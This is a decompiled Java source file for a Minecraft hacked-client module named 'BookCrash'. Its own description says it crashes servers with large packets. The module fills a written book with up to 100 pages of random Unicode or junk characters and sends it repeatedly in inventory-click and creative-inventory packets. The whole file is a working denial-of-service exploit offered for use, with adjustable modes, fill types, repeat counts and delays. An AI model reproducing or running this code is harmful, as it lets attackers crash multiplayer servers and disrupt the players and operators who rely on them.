// 
// Decompiled by Procyon v0.5.36
// 

package meow.candycat.uwu.module.modules.misc;

import java.util.stream.IntStream;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import java.util.stream.Collector;
import java.util.stream.Collectors;
import java.util.Random;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import meow.candycat.uwu.command.Command;
import net.minecraft.client.Minecraft;
import meow.candycat.uwu.setting.Settings;
import meow.candycat.uwu.setting.Setting;
import meow.candycat.uwu.module.Module;

@Info(name = "BookCrash", category = Category.MISC, description = "Crashes servers by sending large packets")
public class BookCrash extends Module
{
    private int currDelay;
    private Setting<Mode> mode;
    private Setting<FillMode> fillMode;
    private Setting<Integer> uses;
    private Setting<Integer> delay;
    private Setting<Integer> pagesSettings;
    private Setting<Boolean> autoToggle;
    
    public BookCrash() {
        this.mode = this.register(Settings.e("Mode", Mode.RAION));
        this.fillMode = this.register(Settings.e("Fill Mode", FillMode.RANDOM));
        this.uses = this.register(Settings.i("Uses", 5));
        this.delay = this.register(Settings.i("Delay", 0));
        this.pagesSettings = this.register(Settings.i("Pages", 50));
        this.autoToggle = this.register(Settings.b("AutoToggle", true));
    }
    
    @Override
    public void onUpdate() {
        if (Minecraft.func_71410_x().func_147104_D() == null || Minecraft.func_71410_x().func_147104_D().field_78845_b.isEmpty()) {
            Command.sendChatMessage("Not connected to a server");
            this.disable();
        }
        this.currDelay = ((this.currDelay >= this.delay.getValue()) ? 0 : (this.delay.getValue() + 1));
        if (this.currDelay > 0) {
            return;
        }
        final ItemStack bookObj = new ItemStack(Items.field_151099_bA);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String author = "Bella";
        final String title = "\n Bella Nuzzles You \n";
        String size = "";
        final int pages = Math.min(this.pagesSettings.getValue(), 100);
        final int pageChars = 210;
        if (this.fillMode.getValue().equals(FillMode.RANDOM)) {
            final IntStream chars = new Random().ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char)i)).collect((Collector<? super Object, ?, String>)Collectors.joining());
        }
        else if (this.fillMode.getValue().equals(FillMode.FFFF)) {
            size = repeat(pages * pageChars, String.valueOf(1114111));
        }
        else if (this.fillMode.getValue().equals(FillMode.ASCII)) {
            final IntStream chars = new Random().ints(32, 126);
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char)i)).collect((Collector<? super Object, ?, String>)Collectors.joining());
        }
        else if (this.fillMode.getValue().equals(FillMode.OLD)) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }
        for (int j = 0; j < pages; ++j) {
            final String siteContent = size;
            final NBTTagString tString = new NBTTagString(siteContent);
            list.func_74742_a((NBTBase)tString);
        }
        tag.func_74778_a("author", author);
        tag.func_74778_a("title", title);
        tag.func_74782_a("pages", (NBTBase)list);
        bookObj.func_77983_a("pages", (NBTBase)list);
        bookObj.func_77982_d(tag);
        for (int j = 0; j < this.uses.getValue(); ++j) {
            BookCrash.mc.field_71442_b.field_78774_b.func_147297_a((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
            if (this.mode.getValue() == Mode.JESSICA) {
                BookCrash.mc.field_71442_b.field_78774_b.func_147297_a((Packet)new CPacketCreativeInventoryAction(0, bookObj));
            }
        }
    }
    
    private static String repeat(final int count, final String with) {
        return new String(new char[count]).replace("\u0000", with);
    }
    
    private enum Mode
    {
        JESSICA, 
        RAION;
    }
    
    private enum FillMode
    {
        ASCII, 
        FFFF, 
        RANDOM, 
        OLD;
    }
}
